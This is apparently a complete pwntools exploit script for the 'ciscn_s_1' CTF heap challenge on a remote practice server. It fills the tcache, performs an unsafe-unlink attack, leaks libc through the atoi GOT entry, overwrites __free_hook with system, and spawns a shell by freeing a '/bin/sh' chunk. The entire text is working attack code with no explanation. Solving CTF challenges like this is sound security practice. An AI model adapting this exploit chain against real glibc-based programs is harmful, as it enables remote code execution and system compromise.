from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_s_1')
io = remote('node4.buuoj.cn', 25445)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('ciscn_s_1')
heap = elf.sym['heap']
len_list = elf.sym['len']
atoi_got = elf.got['atoi']

def add(index, size, content):
    io.sendlineafter('4.show\n', '1')
    io.sendlineafter('index:\n', str(index))
    io.sendlineafter('size:\n', str(size))
    io.sendafter('content:\n', content)


def delete(index):
    io.sendlineafter('4.show\n', '2')
    io.sendlineafter('index:\n', str(index))


def edit(index, content):
    io.sendlineafter('4.show\n', '3')
    io.sendlineafter('index:\n', str(index))
    io.sendafter('content:\n', content)


def show(index):
    io.sendlineafter('4.show\n', '4')
    io.sendlineafter('index:\n', str(index))
    return io.recvline()[:-1]


def unlink():
    for i in range(1, 8):
        add(i, 0xf8, b'\x00')
    add(32, 0xf8, b'\x00')
    add(31, 0xf8, b'\x00')
    for i in range(1, 8):
        delete(i)
    ptr32 = heap + 0x100
    payload = p64(0) + p64(0xf1) + p64(ptr32 - 0x18) + p64(ptr32 - 0x10) + b'\x00' * 0xd0 + p64(0xf0)
    edit(32, payload)
    delete(31)


def pwn():
    payload = b'\x00' * 0x10 + p64(atoi_got) + p64(len_list) + b'\x00' * 0xd0 + p32(1) + p32(3)
    edit(32, payload)
    libc_base = u64(show(31).ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    payload = p32(8) * 32 + p64(__free_hook)
    edit(32, payload)
    edit(0, p64(system))
    # gdb.attach(io)
    # pause()
    add(1, 0x80, '/bin/sh')
    delete(1)
    io.interactive()


if __name__ == '__main__':
    unlink()
    pwn()
